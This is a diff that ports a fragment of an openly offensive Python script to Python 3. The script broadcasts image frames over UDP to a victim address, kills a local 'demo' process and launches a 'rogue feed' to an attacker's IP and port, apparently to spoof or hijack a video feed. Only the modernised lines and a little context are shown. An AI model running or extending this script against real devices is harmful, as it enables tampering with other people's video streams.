@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 VICTIM_IP = '255.255.255.255'
 VICTIM_PORT = 4000
@@ -18,13 +18,12 @@ if len(argv) > 1:
 
 # Load images
 images = []
-for f in sorted(glob('images/%s/*.jpg' % name)):
-    with open(f, mode='rb') as f:
-        images.append(f.read())
+for f in sorted(glob(f'images/{name}/*.jpg')):
+    with open(f, mode='rb') as file:
+        images.append(file.read())
 if len(images) == 0:
-    print "No images found in images/%s" % name
+    print(f"No images found in images/{name}")
     exit(0)
-            
 
 # Create broadcast socket
 s = socket(AF_INET, SOCK_DGRAM)
@@ -42,7 +41,7 @@ system('pkill demo')
 
 # Start rogue feed
 # Sleep to avoid contention over USB
-system('(sleep 3; ./demo %s %d) &' % (ATTACKER_IP, ATTACKER_PORT))
+system(f'(sleep 3; ./demo {ATTACKER_IP} {ATTACKER_PORT}) &')
 
 # Send animation on original feed
 i = 0
